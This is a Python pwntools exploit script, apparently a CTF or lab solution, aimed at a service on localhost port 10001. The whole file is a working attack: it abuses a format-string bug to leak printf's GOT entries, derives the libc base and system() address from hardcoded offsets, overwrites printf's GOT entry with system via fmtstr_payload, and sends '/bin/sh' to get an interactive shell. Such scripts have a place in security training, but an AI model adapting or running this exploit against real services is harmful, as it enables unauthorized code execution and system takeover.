#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
# @File    : leakmemory_remote.py
from pwn import *
import binascii
context.log_level = 'debug'
p = remote('127.0.0.1',10001)

def leak(addr):
    payload = "%9$s.TMP" + p32(addr)
    p.sendline(payload)
    print "leaking:", hex(addr)
    p.recvuntil('right:')
    resp = p.recvuntil(".TMP")
    ret = resp[:-4:]
    print "ret:", binascii.hexlify(ret), len(ret)
    remain = p.recvrepeat(0.2)
    return ret

printf_plt = 0x8048490

# name
p.recv()
p.sendline('moxiaoxi')
p.recv()

# leak printf@got.plt
payload = "%9$sskye" + p32(printf_plt)
p.sendline(payload)
# \xff\x25 junk code
p.recvuntil('right:\xff\x25')
printf_got_plt = u32(p.recv(4))
log.info("printf_got_plt:"+hex(printf_got_plt))

# leak printf@got
payload = "%9$sskye" + p32(printf_got_plt)
p.sendline(payload)
p.recvuntil('right:')
printf_got = u32(p.recv(4))
log.info("printf_got:"+hex(printf_got))
#gdb.attach(p)

# libcdatabase
libc_base = printf_got - 0x00049670
log.info("libc_base:"+hex(libc_base))
system_addr = libc_base + 0x0003ada0
log.info("system_addr:"+hex(system_addr))

payload = fmtstr_payload(7, {printf_got_plt: system_addr})
p.sendline(payload)
p.sendline('/bin/sh\x00')


p.interactive()